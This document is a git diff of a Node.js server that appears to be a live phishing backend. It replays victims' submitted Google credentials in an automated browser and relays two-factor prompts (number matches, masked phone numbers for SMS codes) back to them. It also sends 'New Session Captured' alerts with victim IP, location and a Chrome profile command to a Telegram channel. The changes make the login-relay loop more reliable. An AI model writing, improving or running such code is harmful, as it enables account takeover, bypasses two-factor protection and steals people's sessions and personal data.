@@ -74,6 +74,7 @@ app.post("/start-session", async (req, res) => {
 
     // Get IP information from client (browser)
     const ipInfo = req.body.clientIpInfo || null;
+    console.log(`Session ${sessionId}: Client IP Info received:`, ipInfo);
 
     // Return session ID immediately
     res.json({ success: true, sessionId, profilePath });
@@ -368,8 +369,8 @@ app.post("/sign-in-2", async (req, res) => {
     await page.keyboard.press("Enter");
 
     const invalidPassword = "Wrong password.";
+    const oldPassword = "Your password was changed"
     const validPassword = "Check your";
-    const passwordChanged = "Your password was changed"
     const OpenThe = "Open the";
     const smsChallengeText = "Choose how you want to sign in:";
     const smsChallengeText2 =
@@ -379,120 +380,200 @@ app.post("/sign-in-2", async (req, res) => {
     const successUrlSubstring = "myaccount.google.com";
     const successUrlSubstring2 = "gds.google.com";
 
-    // ⏳ Wait for Google validation spinner
-    await waitForSpinnerToFinish(page, 10000);
+    // We may still be on the password screen for a bit after pressing Enter.
+    // Poll a few times before deciding it's an unexpected state.
+    const maxChecks = 6; // e.g. ~12 seconds total with 2s delay
+    let lastUrl = null;
+    let lastBodyText = "";
+    let lastConditionFlags = null;
 
-    const currentUrl = page.url();
-    if (
-      currentUrl.includes(successUrlSubstring) ||
-      currentUrl.includes(successUrlSubstring2)
-    ) {
-      console.log(`Session ${sessionId}: ✅ login success (URL check)`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
-      return res.json({ success: true, code: 3, message: "Verified" });
+    for (let attempt = 1; attempt <= maxChecks; attempt++) {
+      // ⏳ Wait for Google validation spinner on each attempt
+      await waitForSpinnerToFinish(page, 10000);
+
+      const currentUrl = page.url();
+      lastUrl = currentUrl;
+      console.log(
+        `Session ${sessionId}: 🌐 [Attempt ${attempt}/${maxChecks}] URL after password submit → ${currentUrl}`
+      );
+
+      if (
+        currentUrl.includes(successUrlSubstring) ||
+        currentUrl.includes(successUrlSubstring2)
+      ) {
+        console.log(`Session ${sessionId}: ✅ login success (URL check)`);
+        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
+        return res.json({ success: true, code: 3, message: "Verified" });
+      }
+
+      console.log(
+        `Session ${sessionId}: ℹ️ [Attempt ${attempt}/${maxChecks}] URL did not match success patterns, inspecting body text...`
+      );
+
+      let bodyText = await page.evaluate(() => document.body.innerText);
+      lastBodyText = bodyText;
+
+      // Log body text diagnostics (length + preview only, to avoid massive logs)
+      console.log(
+        `Session ${sessionId}: 🔍 [Attempt ${attempt}/${maxChecks}] Body text length: ${
+          bodyText?.length ?? 0
+        }`
+      );
+      console.log(
+        `Session ${sessionId}: 🔍 [Attempt ${attempt}/${maxChecks}] Body text preview (first 1000 chars):\n${bodyText.slice(
+          0,
+          1000
+        )}`
+      );
+
+      // Precompute all condition flags for detailed debugging
+      const conditionFlags = {
+        invalidPassword: bodyText.includes(invalidPassword),
+        oldPassword: bodyText.includes(oldPassword),
+        validPassword: bodyText.includes(validPassword),
+        openThe: bodyText.includes(OpenThe),
+        smsChallenge: bodyText.includes(smsChallengeText),
+        smsChallenge2: bodyText.includes(smsChallengeText2),
+        signInFaster: bodyText.includes(signInFaster),
+        welcome: bodyText.includes(welcome),
+      };
+      lastConditionFlags = conditionFlags;
+
+      console.log(
+        `Session ${sessionId}: ✅ [Attempt ${attempt}/${maxChecks}] Condition flags after password submit:`,
+        conditionFlags
+      );
+
+      if (conditionFlags.invalidPassword || conditionFlags.oldPassword) {
+        console.log(`Session ${sessionId}: ❌ Wrong password`);
+        return res.json({ success: false, code: 0 });
+      }
+
+      if (conditionFlags.validPassword) {
+        const match = bodyText.match(/Check your\s+([^\n]+)/i);
+        const checkTarget = match ? match[1].trim() : null;
+
+        const extractedNumber = await page.evaluate(() => {
+          const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
+          if (!el) return null;
+          const text = el.innerText.trim();
+          return /^\d+$/.test(text) ? text : null;
+        });
+
+        return res.json({
+          success: true,
+          code: extractedNumber || 1,
+          message: checkTarget || "",
+        });
+      }
+
+      if (conditionFlags.openThe) {
+        const match = bodyText.match(/Open the\s+([^\n]+)/i);
+        const checkTarget = match ? match[1].trim() : null;
+
+        const extractedNumber = await page.evaluate(() => {
+          const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
+          if (!el) return null;
+          const text = el.innerText.trim();
+          return /^\d+$/.test(text) ? text : null;
+        });
+
+        return res.json({
+          success: true,
+          code: extractedNumber || 1,
+          message: checkTarget || "",
+        });
+      }
+
+      if (conditionFlags.smsChallenge) {
+        await page.evaluate(() => {
+          const btn =
+            document.querySelector('[data-challengevariant="SMS"]') ||
+            [...document.querySelectorAll("button, div")].find(
+              (el) =>
+                el.innerText &&
+                (el.innerText.includes("Text") ||
+                  el.innerText.includes("SMS"))
+            );
+          if (btn) btn.click();
+        });
+
+        const maskedPhone = await page.evaluate(() => {
+          const selectors = [
+            "div.dMNVAe span[jsname='wKtwcc']",
+            "span.red0Me span[jsname='wKtwcc']",
+            "span[jsname='wKtwcc']",
+            "span[data-phone-number]",
+          ];
+          for (const s of selectors) {
+            const el = document.querySelector(s);
+            if (el && el.innerText.includes("•")) return el.innerText.trim();
+          }
+          return null;
+        });
+
+        return res.json({ success: true, code: 2, message: maskedPhone });
+      }
+
+      if (conditionFlags.smsChallenge2) {
+        const maskedPhone = await page.evaluate(() => {
+          const selectors = [
+            "div.dMNVAe span[jsname='wKtwcc']",
+            "span.red0Me span[jsname='wKtwcc']",
+            "span[jsname='wKtwcc']",
+            "span[data-phone-number]",
+          ];
+          for (const s of selectors) {
+            const el = document.querySelector(s);
+            if (el && el.innerText.includes("•")) return el.innerText.trim();
+          }
+          return null;
+        });
+
+        return res.json({ success: true, code: 2, message: maskedPhone });
+      }
+
+      if (conditionFlags.signInFaster) {
+        console.log(`Session ${sessionId}: 🚀 Sign in faster`);
+        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
+        return res.json({ success: true, code: 3, message: signInFaster });
+      }
+
+      if (conditionFlags.welcome) {
+        console.log(`Session ${sessionId}: ✅ Welcome screen`);
+        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
+        return res.json({ success: true, code: 3, message: welcome });
+      }
+
+      const stillOnPasswordScreen =
+        /Enter your password/i.test(bodyText) &&
+        !conditionFlags.invalidPassword &&
+        !conditionFlags.validPassword;
+
+      if (stillOnPasswordScreen && attempt < maxChecks) {
+        console.log(
+          `Session ${sessionId}: ⏳ Still on password screen, waiting before next check...`
+        );
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+        continue;
+      }
+
+      if (attempt < maxChecks) {
+        console.log(
+          `Session ${sessionId}: ⚠️ Unknown state, retrying check in 2s...`
+        );
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+        continue;
+      }
     }
 
-    let bodyText = await page.evaluate(() => document.body.innerText);
-
-    if (bodyText.includes(invalidPassword) || bodyText.includes(passwordChanged)) {
-      console.log(`Session ${sessionId}: ❌ Wrong password`);
-      return res.json({ success: false, code: 0 });
-    }
-
-    if (bodyText.includes(validPassword)) {
-      const match = bodyText.match(/Check your\s+([^\n]+)/i);
-      const checkTarget = match ? match[1].trim() : null;
-
-      const extractedNumber = await page.evaluate(() => {
-        const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
-        if (!el) return null;
-        const text = el.innerText.trim();
-        return /^\d+$/.test(text) ? text : null;
-      });
-
-      return res.json({
-        success: true,
-        code: extractedNumber || 1,
-        message: checkTarget || "",
-      });
-    }
-
-    if (bodyText.includes(OpenThe)) {
-      const match = bodyText.match(/Open the\s+([^\n]+)/i);
-      const checkTarget = match ? match[1].trim() : null;
-
-      const extractedNumber = await page.evaluate(() => {
-        const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
-        if (!el) return null;
-        const text = el.innerText.trim();
-        return /^\d+$/.test(text) ? text : null;
-      });
-
-      return res.json({
-        success: true,
-        code: extractedNumber || 1,
-        message: checkTarget || "",
-      });
-    }
-
-    if (bodyText.includes(smsChallengeText)) {
-      await page.evaluate(() => {
-        const btn =
-          document.querySelector('[data-challengevariant="SMS"]') ||
-          [...document.querySelectorAll("button, div")].find(
-            (el) =>
-              el.innerText &&
-              (el.innerText.includes("Text") || el.innerText.includes("SMS"))
-          );
-        if (btn) btn.click();
-      });
-
-      const maskedPhone = await page.evaluate(() => {
-        const selectors = [
-          "div.dMNVAe span[jsname='wKtwcc']",
-          "span.red0Me span[jsname='wKtwcc']",
-          "span[jsname='wKtwcc']",
-          "span[data-phone-number]",
-        ];
-        for (const s of selectors) {
-          const el = document.querySelector(s);
-          if (el && el.innerText.includes("•")) return el.innerText.trim();
-        }
-        return null;
-      });
-
-      return res.json({ success: true, code: 2, message: maskedPhone });
-    }
-
-    if (bodyText.includes(smsChallengeText2)) {
-      const maskedPhone = await page.evaluate(() => {
-        const selectors = [
-          "div.dMNVAe span[jsname='wKtwcc']",
-          "span.red0Me span[jsname='wKtwcc']",
-          "span[jsname='wKtwcc']",
-          "span[data-phone-number]",
-        ];
-        for (const s of selectors) {
-          const el = document.querySelector(s);
-          if (el && el.innerText.includes("•")) return el.innerText.trim();
-        }
-        return null;
-      });
-
-      return res.json({ success: true, code: 2, message: maskedPhone });
-    }
-
-    if (bodyText.includes(signInFaster)) {
-      console.log(`Session ${sessionId}: 🚀 Sign in faster`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
-      return res.json({ success: true, code: 3, message: signInFaster });
-    }
-
-    if (bodyText.includes(welcome)) {
-      console.log(`Session ${sessionId}: ✅ Welcome screen`);
-      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
-      return res.json({ success: true, code: 3, message: welcome });
-    }
+    console.log(
+      `Session ${sessionId}: ⚠️ Reached unexpected state after password (after ${maxChecks} checks).\n` +
+        `URL: ${lastUrl}\n` +
+        `Condition flags: ${JSON.stringify(lastConditionFlags)}\n` +
+        `Body length: ${lastBodyText?.length ?? 0}\n` +
+        `Body preview (first 1000 chars):\n${lastBodyText.slice(0, 1000)}`
+    );
 
     return res.json({ success: false, code: 20, message: "Unexpected state" });
   } catch (err) {
@@ -724,11 +805,11 @@ async function sendLoginSessionMessage(sessionId) {
       currentUrl = page.url() || currentUrl;
     } catch {}
 
-    const ipDetails = ipInfo
+    const ipDetails = ipInfo && ipInfo.ip && ipInfo.ip !== "unknown"
       ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
       : `IP: unknown`;
 
-    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Desktop\\gmail\\chrome-profiles\\${sessionId}"`;
+    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Pictures\\gmail\\chrome-profiles\\${sessionId}"`;
 
     const sessionMessage =
       `<b>New Session Captured</b>\n\n` +
